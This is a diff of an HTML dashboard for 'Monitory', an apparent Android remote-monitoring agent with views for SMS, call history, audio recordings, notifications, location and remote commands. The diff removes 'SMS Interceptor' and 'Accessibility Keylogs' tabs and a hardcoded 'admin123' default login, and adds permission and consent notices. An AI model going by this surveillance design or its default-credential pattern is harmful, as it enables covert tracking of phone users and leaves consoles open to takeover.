@@ -3,8 +3,9 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="color-scheme" content="light dark" />
-  <title>Monitory — Device Console & Remote Agent</title>
+  <meta name="color-scheme" content="dark light" />
+  <meta name="theme-color" content="#0b0d12" />
+  <title>Monitory — Device Operations</title>
   <meta name="description" content="Android Remote Device Management & Monitoring Agent with real-time telemetry, permission controls, and secure command execution." />
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -26,11 +27,11 @@
       <form id="login-form">
         <div class="form-group">
           <label>Email or Username</label>
-          <input type="text" id="login-email" value="clintonumelo15@gmail.com" placeholder="e.g. clintonumelo15@gmail.com" required autocomplete="username" />
+          <input type="text" id="login-email" placeholder="admin@your-organization.com" required autocomplete="username" />
         </div>
         <div class="form-group">
           <label>Password</label>
-          <input type="password" id="login-password" value="admin123" placeholder="Enter your password" required autocomplete="current-password" />
+          <input type="password" id="login-password" placeholder="Enter your password" required autocomplete="current-password" />
         </div>
         <button type="submit" id="btn-login-submit" class="primary" style="width: 100%; margin-top: 10px; padding: 12px; font-size: 12px;">
           Sign In to Workspace
@@ -39,9 +40,7 @@
           <a href="#" id="toggle-auth-mode" style="font-size: 11px; color: var(--accent); text-decoration: none; font-weight: 600;">New account? Click to Register</a>
         </div>
         <div id="login-error-msg" style="color: #f43f5e; background: rgba(244, 63, 94, 0.1); border: 1px solid rgba(244, 63, 94, 0.2); border-radius: 8px; padding: 10px 14px; font-size: 11px; margin-top: 12px; display: none; text-align: center;"></div>
-        <p class="auth-hint">
-          Default Account: <b>clintonumelo15@gmail.com</b> / <b>admin123</b>
-        </p>
+        <p class="auth-hint">Sign in with the administrator account configured for this workspace.</p>
       </form>
     </div>
   </div>
@@ -54,17 +53,29 @@
     </div>
     
     <p class="label">WORKSPACE</p>
-    <nav>
-      <a class="nav-item active" href="#" data-view="overview" id="nav-overview">▦　Overview</a>
-      <a class="nav-item" href="#" data-view="devices" id="nav-devices">▣_Devices <i id="badge-device-count">0</i></a>
-      <a class="nav-item" href="#" data-view="audit" id="nav-audit">◷　Audit Log</a>
-      <a class="nav-item" href="#" data-view="alerts" id="nav-alerts">⌁　Alerts</a>
+    <nav aria-label="Workspace navigation">
+      <a class="nav-item active" href="#" data-view="overview" id="nav-overview"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></svg><span>Overview</span></a>
+      <a class="nav-item" href="#" data-view="devices" id="nav-devices"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><rect x="6" y="2.5" width="12" height="19" rx="2.2"/><path d="M10 18.5h4"/></svg><span>Devices</span><i id="badge-device-count">0</i></a>
     </nav>
-    
-    <p class="label">MANAGE</p>
-    <nav>
-      <a href="#" id="btn-pair-modal-sidebar" onclick="if(window.openPairModal) window.openPairModal(); else document.getElementById('pair-modal').classList.remove('hidden'); return false;">♧　Pair Device</a>
-      <a href="#" id="btn-server-config-sidebar" onclick="if(window.openServerConfigModal) window.openServerConfigModal(); else document.getElementById('server-config-modal').classList.remove('hidden'); return false;">⚙　Server Config</a>
+    <p class="label">DEVICE OPERATIONS</p>
+    <nav aria-label="Device operations">
+      <a class="nav-item" href="#" data-view="live-activity" id="nav-live-activity"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M3 12h4l3-8 4 16 3-8h4"/></svg><span>Live Activity</span><span class="nav-live-dot" aria-hidden="true"></span></a>
+      <a class="nav-item" href="#" data-view="calls" id="nav-calls"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M21 16.2v3a2 2 0 0 1-2.2 2A19.8 19.8 0 0 1 10.2 18a19.4 19.4 0 0 1-6-6A19.8 19.8 0 0 1 2.8 3.9 2 2 0 0 1 4.8 1.7h3a2 2 0 0 1 2 1.7l.5 2.8a2 2 0 0 1-.6 1.8L8 9.7a16 16 0 0 0 6.3 6.3l1.7-1.7a2 2 0 0 1 1.8-.6l2.8.5a2 2 0 0 1 1.4 2z"/></svg><span>Call History</span></a>
+      <a class="nav-item" href="#" data-view="recordings" id="nav-recordings"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m10 9 5 3-5 3z"/></svg><span>Recordings</span></a>
+      <a class="nav-item" href="#" data-view="notifications" id="nav-notifications"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M18 8a6 6 0 0 0-12 0c0 7-3 7-3 9h18c0-2-3-2-3-9"/><path d="M10 21h4"/></svg><span>Notifications</span></a>
+      <a class="nav-item" href="#" data-view="locations" id="nav-locations"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M20 10c0 5-8 12-8 12S4 15 4 10a8 8 0 1 1 16 0Z"/><circle cx="12" cy="10" r="2.5"/></svg><span>Location History</span></a>
+      <a class="nav-item" href="#" data-view="commands" id="nav-commands"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="m8 8-4 4 4 4"/><path d="m16 8 4 4-4 4"/><path d="m14 4-4 16"/></svg><span>Remote Commands</span></a>
+      <a class="nav-item" href="#" data-view="collection" id="nav-collection"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><ellipse cx="12" cy="5" rx="8" ry="3"/><path d="M4 5v7c0 1.7 3.6 3 8 3s8-1.3 8-3V5"/><path d="M4 12v7c0 1.7 3.6 3 8 3s8-1.3 8-3v-7"/></svg><span>Data Collection</span></a>
+    </nav>
+    <p class="label">SECURITY & ACCOUNT</p>
+    <nav aria-label="Security and account">
+      <a class="nav-item" href="#" data-view="audit" id="nav-audit"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M4 4h16v16H4z"/><path d="M8 8h8M8 12h8M8 16h5"/></svg><span>Audit Logs</span></a>
+      <a class="nav-item" href="#" data-view="settings" id="nav-settings"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="3"/><path d="m19.4 15 .1.1 1.2 1-1.4 2.4-1.5-.6a7.5 7.5 0 0 1-1.5.9l-.2 1.6h-2.8l-.3-1.6a7.5 7.5 0 0 1-1.5-.9l-1.5.6-1.4-2.4 1.2-1a7.3 7.3 0 0 1 0-1.8l-1.2-1 1.4-2.4 1.5.6a7.5 7.5 0 0 1 1.5-.9l.3-1.6h2.8l.2 1.6a7.5 7.5 0 0 1 1.5.9l1.5-.6 1.4 2.4-1.2 1a7.3 7.3 0 0 1 0 1.7Z" transform="translate(-1 -1) scale(1.08)"/></svg><span>Settings</span></a>
+    </nav>
+    <p class="label">QUICK ACTIONS</p>
+    <nav aria-label="Quick actions">
+      <a href="#" id="btn-pair-modal-sidebar"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 5v14M5 12h14"/></svg><span>Pair Device</span></a>
+      <a href="#" id="btn-server-config-sidebar"><svg class="nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 8a4 4 0 1 0 0 8 4 4 0 0 0 0-8Z"/><path d="m19.4 15 .1.1 1.2 1-1.4 2.4-1.5-.6a7.5 7.5 0 0 1-1.5.9l-.2 1.6h-2.8l-.3-1.6a7.5 7.5 0 0 1-1.5-.9l-1.5.6-1.4-2.4 1.2-1a7.3 7.3 0 0 1 0-1.8l-1.2-1 1.4-2.4 1.5.6a7.5 7.5 0 0 1 1.5-.9l.3-1.6h2.8l.2 1.6a7.5 7.5 0 0 1 1.5.9l1.5-.6 1.4 2.4-1.2 1a7.3 7.3 0 0 1 0 1.7Z" transform="translate(-1 -1) scale(1.08)"/></svg><span>Server connection</span></a>
     </nav>
 
     <div class="profile">
@@ -108,34 +119,25 @@
         </div>
       </section>
 
-      <!-- 4 COMPACT STATISTIC CARDS -->
-      <section class="stats">
-        <article>
-          <small>Total devices</small>
-          <strong id="stat-total-devices">0</strong>
-          <p><b class="green">↗ Enrolled</b> on management plane</p>
-          <span class="chart blue"></span>
-        </article>
-        <article>
-          <small>Online now</small>
-          <strong id="stat-online-devices">0</strong>
-          <p><b class="green">● Stable</b> connectivity</p>
-          <span class="chart green-chart"></span>
-        </article>
-        <article>
-          <small>Needs attention</small>
-          <strong id="stat-attention-devices">0</strong>
-          <p><b class="amber">Check status</b> devices</p>
-          <span class="chart orange"></span>
-        </article>
-        <article>
-          <small>Average Battery</small>
-          <strong id="stat-avg-battery">--%</strong>
-          <p><b class="green">Fleet</b> power telemetry</p>
-          <span class="chart purple"></span>
-        </article>
+      <!-- Metrics are populated from confirmed backend responses. -->
+      <section class="stats" aria-label="Fleet summary">
+        <article class="stat-card"><div class="stat-top"><span class="stat-icon violet"><svg viewBox="0 0 24 24" aria-hidden="true"><rect x="6" y="2.5" width="12" height="19" rx="2"/><path d="M10 18.5h4"/></svg></span><span class="stat-kicker">ENROLLED</span></div><small>Total devices</small><strong id="stat-total-devices">—</strong><p>Registered to this workspace</p></article>
+        <article class="stat-card"><div class="stat-top"><span class="stat-icon green"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="m8 12 2.5 2.5L16 9"/></svg></span><span class="stat-kicker">CONNECTED</span></div><small>Online devices</small><strong id="stat-online-devices">—</strong><p>Currently marked online</p></article>
+        <article class="stat-card"><div class="stat-top"><span class="stat-icon amber"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg></span><span class="stat-kicker">ATTENTION</span></div><small>Offline devices</small><strong id="stat-attention-devices">—</strong><p>Not currently marked online</p></article>
+        <article class="stat-card"><div class="stat-top"><span class="stat-icon cyan"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3v18M3 12h18"/><circle cx="12" cy="12" r="8"/></svg></span><span class="stat-kicker">COMMAND QUEUE</span></div><small>Pending commands</small><strong id="stat-pending-commands">—</strong><p id="stat-pending-note">Awaiting command status</p></article>
+        <article class="stat-card"><div class="stat-top"><span class="stat-icon violet"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 12h4l3-8 4 16 3-8h4"/></svg></span><span class="stat-kicker">THIS SESSION</span></div><small>Recent events</small><strong id="stat-recent-events">0</strong><p>Observed since this dashboard session began</p></article>
+        <article class="stat-card"><div class="stat-top"><span class="stat-icon green" id="stat-health-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 12h4l3-8 4 16 3-8h4"/></svg></span><span class="stat-kicker">SERVICE STATUS</span></div><small>Server health</small><strong class="stat-word" id="stat-server-health">Checking</strong><p id="stat-server-health-note">Verifying API and live stream</p></article>
+        <span id="stat-avg-battery" class="visually-hidden" aria-hidden="true">—%</span>
       </section>
-
+      <section class="panel activity-chart-panel" aria-labelledby="fleet-activity-title">
+        <div class="panel-head"><div><h2 id="fleet-activity-title">Fleet activity</h2><p>Status snapshots observed during this session</p></div><span class="status-chip neutral" id="fleet-activity-caption">Waiting for telemetry</span></div>
+        <div class="fleet-chart-wrap">
+          <div class="fleet-chart-legend"><span><i class="legend-dot online-dot"></i>Online</span><span><i class="legend-dot offline-dot"></i>Offline</span><span class="chart-note">Historical periods are not synthesized.</span></div>
+          <svg id="activity-chart-svg" viewBox="0 0 720 170" role="img" aria-label="Online and offline device status snapshots for this dashboard session" preserveAspectRatio="none"><line x1="18" y1="26" x2="702" y2="26" class="chart-gridline"/><line x1="18" y1="66" x2="702" y2="66" class="chart-gridline"/><line x1="18" y1="106" x2="702" y2="106" class="chart-gridline"/><line x1="18" y1="146" x2="702" y2="146" class="chart-gridline"/></svg>
+          <p id="activity-chart-empty" class="chart-empty">Live status history will appear after the first device status change.</p>
+          <div class="chart-axis"><span id="activity-chart-start">Session start</span><span id="activity-chart-end">Now</span></div>
+        </div>
+      </section>
       <!-- MAIN GRID: CONNECTED DEVICES + SYSTEM HEALTH -->
       <section class="grid">
         <article class="panel" id="devices-panel">
@@ -200,13 +202,7 @@
             </div>
             <button class="link" id="activityBtn" onclick="showView('audit')">Activity log →</button>
           </div>
-          <div id="overview-activity-list" style="display: flex; flex-direction: column;">
-            <div class="activity">
-              <span class="event green-bg">✓</span>
-              <div><b>Workspace initialized</b><small>Monitory backend ready</small></div>
-              <time>Just now</time>
-            </div>
-          </div>
+          <div id="overview-activity-list" style="display: flex; flex-direction: column;"><div class="empty-state compact">No audit events recorded yet. Verified events will appear here.</div></div>
         </article>
 
         <article class="panel" id="permissions">
@@ -241,6 +237,11 @@
         <button onclick="document.getElementById('pair-modal').classList.remove('hidden')" class="primary">+ Pair Android Device</button>
       </section>
 
+      <div class="page-toolbar device-filters" aria-label="Filter devices">
+        <div class="toolbar-search"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m16 16 4 4"/></svg><input id="premium-device-model-filter" type="search" placeholder="Search name, model or ID…" aria-label="Search devices by name, model or ID" /></div>
+        <select id="premium-device-status-filter" class="input-control" aria-label="Filter by connection status"><option value="all">All connection states</option><option value="ONLINE">Online</option><option value="OFFLINE">Offline</option></select>
+        <select id="premium-device-enrollment-filter" class="input-control" aria-label="Filter by enrollment state"><option value="all">All enrollment states</option><option value="enrolled">Enrolled</option></select>
+      </div>
       <div id="devices-grid" class="devices-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px;">
         <div style="grid-column: 1 / -1; padding: 50px 20px; text-align: center; color: var(--muted); background: var(--panel); border: 1px solid var(--line); border-radius: 15px;">
           <h3>No Devices Registered</h3>
@@ -346,15 +347,15 @@
         <button class="tab-btn" data-tab="tab-health">Health Telemetry</button>
         <button class="tab-btn" data-tab="tab-commands">Command Center</button>
         <button class="tab-btn" data-tab="tab-notifications">Notifications</button>
-        <button class="tab-btn" data-tab="tab-sms">SMS Interceptor</button>
-        <button class="tab-btn" data-tab="tab-calls">Call Logs</button>
+        <button class="tab-btn" data-tab="tab-sms">SMS History</button>
+        <button class="tab-btn" data-tab="tab-calls">Call History</button>
         <button class="tab-btn" data-tab="tab-contacts">Contacts</button>
         <button class="tab-btn" data-tab="tab-apps">Applications</button>
         <button class="tab-btn" data-tab="tab-usage">Usage Analytics</button>
         <button class="tab-btn" data-tab="tab-files">File Explorer</button>
-        <button class="tab-btn" data-tab="tab-recordings">Audio Records</button>
-        <button class="tab-btn" data-tab="tab-keystrokes">Accessibility Keylogs</button>
-        <button class="tab-btn" data-tab="tab-permissions">Permission Audit</button>
+        <button class="tab-btn" data-tab="tab-recordings">Recordings</button>
+        
+        <button class="tab-btn" data-tab="tab-permissions">Collection Permissions</button>
       </div>
 
       <!-- TAB 1: CONSOLE HUB OVERVIEW -->
@@ -769,6 +770,73 @@
           </table>
         </div>
       </div>
+    </section>
+
+
+    <section id="view-live-activity" class="view-content">
+      <section class="heading"><div><small class="eyebrow">OPERATIONS STREAM</small><h1>Live activity</h1><p>Events observed from the dashboard WebSocket connection. This feed starts with this session.</p></div><span id="premium-live-state" class="status-chip neutral"><i class="state-dot"></i> Synchronizing</span></section>
+      <section class="panel"><div class="panel-head"><div><h2>Event stream</h2><p id="premium-live-summary">Waiting for supported events</p></div><button type="button" id="premium-live-clear" class="secondary-action">Clear session feed</button></div>
+        <div class="page-toolbar"><div class="toolbar-search"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m16 16 4 4"/></svg><input id="premium-live-search" type="search" placeholder="Search events…" aria-label="Search live events" /></div><select id="premium-live-category" class="input-control" aria-label="Filter events"><option value="all">All event categories</option><option value="status">Device status</option><option value="location">Location</option><option value="notifications">Notifications</option><option value="commands">Commands</option><option value="recordings">Recordings</option><option value="alerts">Alerts</option><option value="enrollment">Enrollment</option></select></div>
+        <div id="premium-live-activity-list" class="activity-feed"><div class="empty-state"><span class="empty-symbol">↗</span><b>Waiting for live events</b><p>Device activity appears after the WebSocket stream delivers a supported event.</p></div></div></section>
+    </section>
+    <section id="view-calls" class="view-content">
+      <section class="heading"><div><small class="eyebrow">AUTHORIZED DEVICE DATA</small><h1>Call history</h1><p>Records are shown only when device permission state confirms call-log access.</p></div><span class="status-chip neutral">Permission-gated</span></section>
+      <section class="panel"><div class="panel-head"><div><h2>Call records</h2><p id="premium-calls-summary">Loading authorized device records…</p></div><button type="button" id="premium-calls-refresh" class="secondary-action">Refresh</button></div>
+        <div class="page-toolbar"><div class="toolbar-search"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m16 16 4 4"/></svg><input id="premium-calls-search" type="search" placeholder="Search name or number…" aria-label="Search calls" /></div><select id="premium-calls-device-filter" class="input-control" aria-label="Filter by device"><option value="all">All permitted devices</option></select><select id="premium-calls-direction-filter" class="input-control" aria-label="Filter by call direction"><option value="all">All directions</option><option value="INCOMING">Incoming</option><option value="OUTGOING">Outgoing</option><option value="MISSED">Missed</option></select></div>
+        <div class="inline-notice"><span class="notice-icon">i</span><p>Recording associations require an explicit identifier. The dashboard will not match an audio file to a call based only on nearby timestamps.</p></div>
+        <div class="tablewrap"><table class="data-table"><thead><tr><th>CONTACT</th><th>DEVICE</th><th>DIRECTION</th><th>DATE & TIME</th><th>DURATION</th><th>RECORDING LINK</th></tr></thead><tbody id="premium-calls-table-body"><tr><td colspan="6" class="text-center">Loading…</td></tr></tbody></table></div></section>
+    </section>
+    <section id="view-recordings" class="view-content">
+      <section class="heading"><div><small class="eyebrow">CONSENT-BASED MEDIA</small><h1>Recordings</h1><p>Recording metadata from permitted devices, with upload state and playback availability.</p></div><span class="status-chip warning"><i class="state-dot"></i> Protected media required</span></section>
+      <div class="inline-notice privacy-notice"><span class="notice-icon">⌑</span><p>Only recording metadata from devices reporting microphone authorization is listed. The current server exposes uploads as static files; authenticated playback and downloads require a protected media endpoint, so file links are not exposed here.</p></div>
+      <section class="panel"><div class="panel-head"><div><h2>Recording library</h2><p id="premium-recordings-summary">Loading permitted recording metadata…</p></div><button type="button" id="premium-recordings-refresh" class="secondary-action">Refresh</button></div>
+        <div class="page-toolbar"><div class="toolbar-search"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m16 16 4 4"/></svg><input id="premium-recordings-search" type="search" placeholder="Search filename…" aria-label="Search recordings" /></div><select id="premium-recordings-device-filter" class="input-control" aria-label="Filter recordings by device"><option value="all">All permitted devices</option></select></div>
+        <div class="recordings-layout"><div id="premium-recordings-list" class="recording-list"><div class="empty-state"><span class="empty-symbol">▷</span><b>No recording metadata loaded</b><p>Permitted recording records appear when available from the backend.</p></div></div>
+          <aside class="recording-player-panel"><div class="player-art"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 9v6M8 5v14M12 2v20M16 6v12M20 9v6"/></svg></div><span class="eyebrow">SECURE PLAYBACK</span><h3 id="premium-player-title">Select a recording</h3><p id="premium-player-meta">Duration and size display only when returned by the API.</p>
+            <div class="player-controls"><button id="premium-player-play" type="button" class="player-button" disabled aria-label="Play recording">▶</button><div class="player-track"><span></span></div><span id="premium-player-duration">—:—</span></div>
+            <div class="player-volume"><span>Playback</span><span id="premium-player-status">Unavailable until protected streaming is supported.</span></div><audio id="premium-audio-player" controls preload="none" hidden></audio><button id="premium-recording-download" type="button" class="secondary-action full-width" disabled>Download recording</button>
+            <p class="player-footnote">The current recording API returns metadata and a static file path, not an authenticated stream. Playback and download remain disabled to avoid exposing private audio through a public URL.</p></aside>
+        </div></section>
+    </section>
+    <section id="view-notifications" class="view-content">
+      <section class="heading"><div><small class="eyebrow">DEVICE MESSAGES</small><h1>Notifications</h1><p>Notification records from devices that report notification-listener authorization.</p></div><button type="button" id="premium-open-alerts" class="secondary-action">View security alerts</button></section>
+      <section class="panel"><div class="panel-head"><div><h2>Collected notifications</h2><p id="premium-notifications-summary">Loading permission-gated records…</p></div><button type="button" id="premium-notifications-refresh" class="secondary-action">Refresh</button></div>
+        <div class="page-toolbar"><div class="toolbar-search"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m16 16 4 4"/></svg><input id="premium-notifications-search" type="search" placeholder="Search title, app or content…" aria-label="Search notifications" /></div><select id="premium-notifications-device-filter" class="input-control" aria-label="Filter notifications by device"><option value="all">All permitted devices</option></select></div>
+        <div class="inline-notice"><span class="notice-icon">i</span><p>The current API does not persist read/unread state. Items are labelled by receipt; this screen does not infer read status.</p></div>
+        <div class="tablewrap"><table class="data-table"><thead><tr><th>APPLICATION</th><th>NOTIFICATION</th><th>DEVICE</th><th>RECEIVED</th><th>CATEGORY</th></tr></thead><tbody id="premium-notifications-table-body"><tr><td colspan="5" class="text-center">Loading…</td></tr></tbody></table></div></section>
+    </section>
+    <section id="view-locations" class="view-content">
+      <section class="heading"><div><small class="eyebrow">CONSENTED LOCATION DATA</small><h1>Location history</h1><p>Entries are requested only for devices reporting location permission.</p></div><button type="button" id="premium-locations-refresh" class="secondary-action">Refresh locations</button></section>
+      <div id="premium-location-permission-note" class="inline-notice"><span class="notice-icon">⌖</span><p>Timestamps and accuracy depend on the fields supplied by each device.</p></div>
+      <section class="panel location-panel"><div class="panel-head"><div><h2>Fleet map</h2><p id="premium-location-map-caption">A map appears when authorized coordinates are available.</p></div><span class="status-chip neutral">OpenStreetMap tiles</span></div><div id="premium-location-map-empty" class="map-placeholder"><div class="empty-symbol">⌖</div><b>No authorized location points available</b><p>Location entries appear only when permission is reported and the device has synchronized coordinates.</p></div><div id="premium-fleet-map" class="map-canvas" hidden aria-label="Map of authorized device location points"></div></section>
+      <section class="panel"><div class="panel-head"><div><h2>Location timeline</h2><p id="premium-locations-summary">No data loaded</p></div></div><div class="page-toolbar"><div class="toolbar-search"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m16 16 4 4"/></svg><input id="premium-locations-search" type="search" placeholder="Search device or provider…" aria-label="Search location records" /></div><select id="premium-locations-device-filter" class="input-control" aria-label="Filter locations by device"><option value="all">All permitted devices</option></select></div>
+        <div class="tablewrap"><table class="data-table"><thead><tr><th>DEVICE</th><th>RECORDED AT</th><th>ACCURACY</th><th>PROVIDER</th><th>COORDINATES</th></tr></thead><tbody id="premium-locations-table-body"><tr><td colspan="5" class="text-center">Loading…</td></tr></tbody></table></div></section>
+    </section>
+    <section id="view-commands" class="view-content">
+      <section class="heading"><div><small class="eyebrow">CONTROL PLANE</small><h1>Remote commands</h1><p>Send only supported sync and refresh requests after an explicit confirmation and permission check.</p></div><span id="premium-command-connection" class="status-chip neutral">Checking device connection</span></section>
+      <section class="command-layout"><article class="panel command-compose"><div class="panel-head"><div><h2>Compose request</h2><p>Device availability and required permissions are checked before dispatch.</p></div></div>
+        <form id="premium-command-form" class="command-form"><label for="premium-command-device">Target device</label><select id="premium-command-device" class="input-control" required><option value="">Select an enrolled device</option></select>
+          <label for="premium-command-type">Command</label><select id="premium-command-type" class="input-control" required><option value="SYNC_DEVICE">Request device sync</option><option value="REFRESH_TELEMETRY">Refresh device status</option><option value="REFRESH_PERMISSIONS">Refresh permission state</option><option value="REQUEST_LOCATION">Request location update</option><option value="REQUEST_APPS">Request app inventory</option><option value="REQUEST_USAGE">Request usage summary</option><option value="SYNC_NOTIFICATIONS">Synchronize notifications</option><option value="SYNC_FILES">Synchronize file metadata</option><option value="SYNC_CONTACTS">Synchronize contacts</option></select>
+          <p id="premium-command-permission-hint" class="field-hint">Choose a device to see its current permission state.</p><label for="premium-command-note">Request note <span class="optional-label">Optional</span></label><input id="premium-command-note" class="input-control" type="text" maxlength="140" placeholder="Reason for this request" /><button type="submit" class="primary full-width" id="premium-run-command">Review &amp; send request</button></form>
+        <div id="premium-command-feedback" class="command-feedback" role="status">No command sent in this session.</div></article>
+        <article class="panel"><div class="panel-head"><div><h2>Command lifecycle</h2><p>Queue state and device acknowledgment from the backend</p></div><button id="premium-commands-refresh" type="button" class="secondary-action">Refresh</button></div><div class="command-steps"><span>Queued</span><i></i><span>Sent</span><i></i><span>Acknowledged</span><i></i><span>Completed / Failed</span></div><p class="field-hint">A healthy API does not guarantee an active device socket. Queued and dispatched states are reported separately.</p></article></section>
+      <section class="panel"><div class="panel-head"><div><h2>Command history</h2><p id="premium-commands-summary">Loading persisted command records…</p></div></div><div class="tablewrap"><table class="data-table"><thead><tr><th>REQUESTED</th><th>DEVICE</th><th>COMMAND</th><th>STATUS</th><th>RESULT / REASON</th></tr></thead><tbody id="premium-commands-table-body"><tr><td colspan="5" class="text-center">Loading…</td></tr></tbody></table></div></section>
+    </section>
+    <section id="view-collection" class="view-content">
+      <section class="heading"><div><small class="eyebrow">SYNCHRONIZATION & PERMISSIONS</small><h1>Data collection</h1><p>Review reported permissions and connection freshness; unavailable permissions are never assumed to be granted.</p></div><button type="button" id="premium-collection-refresh" class="secondary-action">Refresh status</button></section>
+      <div class="inline-notice privacy-notice"><span class="notice-icon">◇</span><p>Initial baseline collection, incremental synchronization, and manually requested refreshes are distinct operations. This dashboard exposes the existing sync command only; the device agent must continue honoring permissions granted by its owner.</p></div>
+      <section class="panel"><div class="panel-head"><div><h2>Collection status by device</h2><p id="premium-collection-summary">Loading device permission status…</p></div><button type="button" id="premium-collection-sync" class="primary">Request sync</button></div>
+        <div class="page-toolbar"><select id="premium-collection-device-filter" class="input-control" aria-label="Choose device to synchronize"><option value="">Select a device for manual sync</option></select><span class="field-hint">A manual sync is queued only after confirmation and when the device is online.</span></div>
+        <div class="tablewrap"><table class="data-table"><thead><tr><th>DEVICE</th><th>DATA CATEGORY</th><th>PERMISSION</th><th>DEVICE STATUS</th><th>LAST SEEN</th></tr></thead><tbody id="premium-collection-table-body"><tr><td colspan="5" class="text-center">Loading…</td></tr></tbody></table></div></section>
+    </section>
+    <section id="view-settings" class="view-content">
+      <section class="heading"><div><small class="eyebrow">WORKSPACE PREFERENCES</small><h1>Settings</h1><p>Manage local display preferences and inspect current server connectivity.</p></div><span class="status-chip neutral">Administrator</span></section>
+      <section class="settings-grid">
+        <article class="panel settings-card"><div class="settings-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg></div><h2>Appearance</h2><p>Choose a theme for this browser. The preference is stored locally.</p><div class="settings-inline"><span>Dark / light theme</span><button type="button" id="premium-settings-theme" class="secondary-action">Toggle theme</button></div></article>
+        <article class="panel settings-card"><div class="settings-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="4" width="18" height="14" rx="2"/><path d="M8 22h8M12 18v4"/></svg></div><h2>Server connection</h2><p>Inspect API and WebSocket endpoints. Secrets and administrator passwords are never shown here.</p><div class="settings-state"><span>API health</span><b id="premium-settings-api-status">Checking…</b></div><div class="settings-state"><span>Dashboard stream</span><b id="premium-settings-ws-status">Synchronizing</b></div><div class="settings-inline"><span>Endpoint configuration</span><button type="button" id="premium-open-server-config" class="secondary-action">View connection</button></div><button type="button" id="premium-settings-health-refresh" class="secondary-action full-width">Check connection again</button></article>
+        <article class="panel settings-card"><div class="settings-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div><h2>Administrator account</h2><p id="premium-settings-account">Signed-in account information comes from the authentication response.</p><div class="settings-state"><span>Role</span><b class="status-chip neutral">Workspace administrator</b></div><div class="settings-inline"><span>Session</span><button type="button" id="premium-settings-logout" class="secondary-action">Sign out</button></div></article>
+        <article class="panel settings-card"><div class="settings-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 22s8-4 8-11V5l-8-3-8 3v6c0 7 8 11 8 11z"/><path d="m9 12 2 2 4-4"/></svg></div><h2>Privacy & authorization</h2><p>Device permissions come from the existing permissions endpoint. Sensitive collection is unavailable when permission is false or unknown.</p><div class="settings-state"><span>Call / recording matching</span><b>Explicit identifier only</b></div><div class="settings-state"><span>Live event history</span><b>Session only</b></div><div class="settings-state"><span>Media playback</span><b>Protected route required</b></div></article>
+      </section>
     </section>
 
     <!-- VIEW 5: ALERTS -->
